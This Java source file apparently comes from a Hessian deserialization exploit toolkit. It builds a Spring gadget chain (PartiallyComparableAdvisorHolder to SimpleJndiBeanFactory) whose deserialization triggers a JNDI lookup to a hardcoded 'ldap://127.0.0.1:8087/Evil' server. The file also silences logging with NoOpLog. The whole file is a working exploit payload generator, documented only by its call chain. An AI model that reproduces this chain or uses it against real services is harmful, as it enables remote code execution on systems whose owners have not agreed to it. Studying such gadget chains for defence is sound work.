package hessian.payloadGroups;

import gadgetFragment.ToStringFragment;
import hessian.PayloadRunner;
import jdk.payloadGroups.ObjectPayload;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import util.Reflections;

/**
 * java.util.concurrent.ConcurrentHashMap.put
 * java.util.concurrent.ConcurrentHashMap.putVal
 * java.util.AbstractMap$SimpleImmutableEntry.equals
 * java.util.AbstractMap.access$000
 * java.util.AbstractMap.eq
 * javax.sound.sampled.AudioFormat$Encoding.equals
 * org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString
 * org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor.getAdvice
 * org.springframework.jndi.support.SimpleJndiBeanFactory.getBean
 * org.springframework.jndi.support.SimpleJndiBeanFactory.doGetSingleton
 * org.springframework.jndi.JndiLocatorSupport.lookup
 * org.springframework.jndi.JndiTemplate.lookup
 */
public class SpringPartiallyComparableAdvisorHolder extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        command = "ldap://127.0.0.1:8087/Evil";
        Class clazz = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object partiallyComparableAdvisorHolder = Reflections.createWithObjectNoArgsConstructor(clazz);
        DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
        Reflections.setFieldValue(partiallyComparableAdvisorHolder, "advisor", defaultBeanFactoryPointcutAdvisor);
        BeanFactory bf = makeJNDITrigger(command);
        Reflections.setFieldValue(defaultBeanFactoryPointcutAdvisor, "beanFactory", bf);
        Reflections.setFieldValue(defaultBeanFactoryPointcutAdvisor, "adviceBeanName", command);

        return ToStringFragment.getAdFEncoding(partiallyComparableAdvisorHolder, 6);
    }

    public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SpringPartiallyComparableAdvisorHolder.class, args);
    }
}
